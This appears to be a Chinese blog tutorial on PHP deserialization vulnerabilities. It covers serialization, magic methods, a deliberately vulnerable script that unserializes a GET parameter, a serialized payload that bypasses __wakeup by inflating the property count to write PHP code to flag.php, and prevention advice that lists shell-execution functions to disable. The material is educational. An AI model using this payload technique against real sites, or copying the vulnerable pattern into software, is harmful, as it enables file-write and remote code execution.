{"blogid": "124841251", "writerAge": "码龄4年", "writerBlogNum": "58", "writerCollect": "398", "writerComment": "43", "writerFan": "630", "writerGrade": "4级", "writerIntegral": "1236", "writerName": "Beyond My", "writerProfileAdress": "writer_image\\profile_124841251.jpg", "writerRankTotal": "21675", "writerRankWeekly": "277742", "writerThumb": "125", "writerVisitNum": "116503", "blog_read_count": "860", "blog_time": "于 2022-05-18 16:29:52 发布", "blog_title": "反序列化漏洞（PHP）", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h2><a id=\"_0\"></a>反序列化漏洞</h2>\n<p><strong>0x01. 序列化和反序列化是什么</strong></p>\n<blockquote>\n<p>序列化：变量转换为可保存或传输的字符串的过程；<br/> 反序列化：把序列化的字符串再转化成原来的变量使用<br/> 作用：可轻松地存储和传输数据，使程序更具维护性</p>\n</blockquote>\n<p><strong>0x02. 为什么会有序列化</strong></p>\n<blockquote>\n<p>序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构</p>\n</blockquote>\n<p><strong>0x03. 序列化和反序列化代码示例</strong></p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'123456'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// 序列化操作</span>\n<span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$str_ser</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"序列化结果为:\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str_ser</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"反序列化结果为:\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 反序列化操作</span>\n<span class=\"token variable\">$str_uns</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'O:4:\"User\":2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:6:\"123456\";}'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str_uns</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>运行结果：<br/> <img alt=\"在这里插入图片描述\" src=\"image\\831889105db2465a953d5aaa5ea21312.png\"/><br/> 序列化后的格式如下：<br/> <img alt=\"在这里插入图片描述\" src=\"image\\4233ca90162d4d8d961ca5389a83894b.png\"/></p>\n<p><strong>0x04. 魔术方法</strong></p>\n<blockquote>\n<p>魔术方法是PHP面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，你可以把它们理解为钩子，利用模式方法可以轻松实现PHP面向对象中重载（Overloading即动态创建类属性和方法）</p>\n</blockquote>\n<pre><code class=\"prism language-php\"><span class=\"token number\">1.</span>__construct，__destruct\n\n__constuct构建对象的时被调用；\n__destruct明确销毁对象或脚本结束时被调用；\n\n<span class=\"token number\">2.</span>__get，__set\n\n__set当给不可访问或不存在属性赋值时被调用\n__get读取不可访问或不存在属性时被调用\n\n<span class=\"token number\">3.</span>__isset，__unset\n\n__isset对不可访问或不存在的属性调用<span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>或<span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>时被调用\n__unset对不可访问或不存在的属性进行<span class=\"token keyword\">unset</span>时被调用\n\n<span class=\"token number\">4.</span>__sleep，__wakeup\n\n__sleep当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用\n__wakeup当使用unserialize时被调用，可用于做些对象的初始化操作\n</code></pre>\n<p><strong>0x05. 反序列化漏洞成因</strong></p>\n<blockquote>\n<p>当传给 unserialize() 的<strong>参数可控</strong>时，那么就可以注入精心构造的payload，而当进行反序列化的时候就有可能会触发对象中的一些魔术方法，造成恶意命令执行！</p>\n</blockquote>\n<p><strong>0x06. 反序列化漏洞举例</strong><br/> （1）测试代码如下：</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Content-Type:text/html;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">vFREE</span><span class=\"token punctuation\">{<!-- --></span>\n<span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'vFREE'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'18'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">age</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"18\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"执行了wakeup魔术方法&lt;br&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n<span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"执行了destruct魔术方法\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$path</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$file_get</span><span class=\"token operator\">=</span><span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$unser</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>解释：类外部用到了反序列化函数unserialize，但用到这个函数时，就会像检查类vFREE中有没有__wakeup方法，有的话就执行，没有就跳过，很明显，代码中有wakeup，但是wakeup的内容就是一个赋值操作，并起不了太大的作用，反而destruct中可以利用一波，因为destruct中打开一个flag.php的文件，然后将$this-&gt;name的值作为内容写入到flag.php中，假如我们写入一个木马，便可以Getshell</p>\n<p>（2）我们要传入一个参数flag，并且将传入的值放入反序列化函数中执行，所以我们要传入的应该是一个序列化后的字符串，此时我们应该类vFREE进行序列化，代码如下:</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">vFREE</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'vFREE'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'18'</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">age</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"18\"</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$path</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file_get</span><span class=\"token operator\">=</span><span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                         <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">vFREE</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   \n<span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$test</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span> \n</code></pre>\n<pre><code class=\"prism language-php\">得到序列化后的结果：<span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"vFREE\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{<!-- --></span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"vFREE\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"age\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"18\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\3e6d9aec19ab4c3b9ac5ef7b1565cd89.png\"/><br/> （3）绕过wakeup方法：</p>\n<blockquote>\n<p>绕过wakeup方法，直接执行destruct写入shell：<br/> 更改原有属性值达到绕过过wakeup的效果，此时的类中属性值是2，我们只要将属性值改为大于2，即可绕过，如下改成5，便可以绕过：</p>\n</blockquote>\n<pre><code class=\"prism language-php\"><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"vFREE\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{<!-- --></span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"&lt;?php phpinfo();?&gt;\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"age\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"18\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span>\n</code></pre>\n<p>（4）传入恶意payload，成功创建flag.php<br/> <img alt=\"在这里插入图片描述\" src=\"image\\2fa345729de447ba9e8b4ce766c83a71.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\bc2a616d9ef04b59ac19cf53421c5016.png\"/></p>\n<p>（5）查看生成的flag.php，利用成功</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\886dced3e8334a06a82706fad600c733.png\"/></p>\n<p><strong>0x07. 反序列化漏洞预防</strong></p>\n<pre><code class=\"prism language-php\">（<span class=\"token number\">1</span>）安全配置好php相关参数\n通过Php配置文件里面有个disable_functions <span class=\"token operator\">=</span> 配置\n这个禁止某些php函数，服务器便是用这个来禁止php的执行命令函数\n <span class=\"token comment\">#禁止这些函数来执行系统命令</span>\n例：disable_functions <span class=\"token operator\">=</span>system<span class=\"token punctuation\">,</span>passthru<span class=\"token punctuation\">,</span>shell_exec，exec，popen  \n（<span class=\"token number\">2</span>）严格控制传入变量，严谨使用魔法函数\n</code></pre>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}